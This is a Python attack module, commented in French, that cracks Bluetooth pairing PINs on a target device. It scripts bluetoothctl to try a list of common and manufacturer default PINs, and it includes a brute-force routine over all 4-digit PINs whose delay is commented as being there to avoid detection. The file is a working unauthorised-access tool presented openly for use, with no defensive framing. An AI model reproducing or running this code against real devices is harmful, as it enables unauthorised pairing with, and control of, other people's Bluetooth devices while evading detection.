#!/usr/bin/env python3
"""
Module d'attaque PIN Cracking - Crackage de codes PIN Bluetooth
"""

import subprocess
import socket
import struct
import time
import itertools
from typing import Optional, Callable

class PINCrackingAttack:
    def __init__(self, config: dict, callback: Optional[Callable] = None):
        self.config = config
        self.callback = callback
        self.running = False
        
    def execute(self, target_address: str, pin_list: list = None) -> bool:
        """Exécuter l'attaque PIN Cracking"""
        try:
            self.running = True
            self._log("Démarrage de l'attaque PIN Cracking...", "info")
            
            # Liste de PINs par défaut si aucune fournie
            if not pin_list:
                pin_list = self._get_default_pin_list()
                
            # Vérifier la vulnérabilité PIN
            if not self._check_pin_vulnerability(target_address):
                self._log("Cible non vulnérable au PIN Cracking", "warning")
                return False
                
            # Essayer de cracker le PIN
            cracked_pin = self._crack_pin(target_address, pin_list)
            
            if cracked_pin:
                self._log(f"PIN cracké avec succès: {cracked_pin}", "success")
                return True
            else:
                self._log("PIN non trouvé dans la liste", "warning")
                return False
                
        except Exception as e:
            self._log(f"Erreur lors de l'attaque PIN Cracking: {e}", "error")
            return False
        finally:
            self.running = False
            
    def _check_pin_vulnerability(self, target_address: str) -> bool:
        """Vérifier si la cible est vulnérable au PIN Cracking"""
        try:
            self._log("Vérification de la vulnérabilité PIN...", "info")
            
            # Vérifier si l'appareil est en mode découverte
            cmd = ['hcitool', 'info', target_address]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                output = result.stdout.lower()
                
                # Vérifier si l'appareil est appairable
                if 'discoverable' in output or 'pairable' in output:
                    self._log("Appareil en mode découverte", "info")
                    return True
                else:
                    self._log("Appareil non en mode découverte", "warning")
                    return False
            else:
                self._log("Impossible d'obtenir les informations", "warning")
                return False
                
        except Exception as e:
            self._log(f"Erreur lors de la vérification: {e}", "error")
            return False
            
    def _get_default_pin_list(self) -> list:
        """Obtenir la liste de PINs par défaut"""
        # PINs les plus courants
        common_pins = [
            "0000", "1111", "1234", "2222", "3333", "4444", "5555",
            "6666", "7777", "8888", "9999", "0123", "1230", "0001",
            "1110", "1212", "2020", "2021", "2022", "2023", "2024"
        ]
        
        # PINs spécifiques aux fabricants
        manufacturer_pins = [
            "0000", "1111", "1234", "4321", "5678", "8765", "9999",
            "8888", "7777", "6666", "5555", "4444", "3333", "2222"
        ]
        
        # PINs à 6 chiffres
        six_digit_pins = [
            "000000", "111111", "123456", "654321", "999999", "888888"
        ]
        
        return common_pins + manufacturer_pins + six_digit_pins
        
    def _crack_pin(self, target_address: str, pin_list: list) -> Optional[str]:
        """Cracker le PIN en essayant la liste"""
        try:
            self._log(f"Tentative de crackage avec {len(pin_list)} PINs...", "info")
            
            max_attempts = self.config.get('max_attempts', 50)
            delay = self.config.get('delay', 1)
            
            for i, pin in enumerate(pin_list):
                if not self.running:
                    break
                    
                if i >= max_attempts:
                    self._log(f"Nombre maximum d'essais atteint ({max_attempts})", "warning")
                    break
                    
                self._log(f"Essai {i+1}/{min(len(pin_list), max_attempts)}: PIN {pin}", "info")
                
                if self._try_pin(target_address, pin):
                    return pin
                    
                # Délai entre les essais
                time.sleep(delay)
                
            return None
            
        except Exception as e:
            self._log(f"Erreur lors du crackage: {e}", "error")
            return None
            
    def _try_pin(self, target_address: str, pin: str) -> bool:
        """Essayer un PIN spécifique"""
        try:
            # Utiliser bluetoothctl pour essayer le PIN
            process = subprocess.Popen(
                ['bluetoothctl'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Séquence de commandes pour essayer le PIN
            commands = [
                f"scan on",
                f"pair {target_address}",
                f"{pin}",
                "quit"
            ]
            
            input_data = "\n".join(commands)
            stdout, stderr = process.communicate(input=input_data, timeout=30)
            
            # Vérifier si l'appairage a réussi
            if "successful" in stdout.lower() or "paired" in stdout.lower():
                self._log(f"PIN correct trouvé: {pin}", "success")
                return True
            else:
                return False
                
        except subprocess.TimeoutExpired:
            process.kill()
            return False
        except Exception as e:
            self._log(f"Erreur lors de l'essai du PIN {pin}: {e}", "warning")
            return False
            
    def _bruteforce_pin(self, target_address: str) -> Optional[str]:
        """Méthode de bruteforce pour PINs courts"""
        try:
            self._log("Tentative de bruteforce pour PINs courts...", "info")
            
            # Essayer les PINs à 4 chiffres
            for pin in itertools.product('0123456789', repeat=4):
                if not self.running:
                    break
                    
                pin_str = ''.join(pin)
                self._log(f"Bruteforce: {pin_str}", "info")
                
                if self._try_pin(target_address, pin_str):
                    return pin_str
                    
                # Délai pour éviter la détection
                time.sleep(0.5)
                
            return None
            
        except Exception as e:
            self._log(f"Erreur lors du bruteforce: {e}", "error")
            return None
            
    def _log(self, message: str, level: str = "info"):
        """Logger un message"""
        if self.callback:
            self.callback(message, level)
        else:
            print(f"[{level.upper()}] {message}")
            
    def stop(self):
        """Arrêter l'attaque"""
        self.running = False
